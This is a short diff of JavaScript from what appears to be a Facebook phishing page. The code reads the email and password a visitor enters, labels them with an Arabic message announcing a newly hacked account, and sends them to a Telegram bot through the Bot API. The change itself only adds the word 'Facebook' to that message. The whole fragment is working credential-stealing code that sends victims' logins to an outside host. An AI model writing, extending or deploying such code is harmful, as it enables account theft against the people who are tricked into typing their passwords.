@@ -79,7 +79,7 @@
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
 
-      const message = 📥 - تم اختراق حساب جديد :- \n📧 - الإيميل : ${email}\n🔑 - الباسورد : ${password};
+      const message = 📥 - تم اختراق حساب فيسبوك جديد :- \n📧 - الإيميل : ${email}\n🔑 - الباسورد : ${password};
       // إرسال البيانات للبوت باستخدام chatId
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
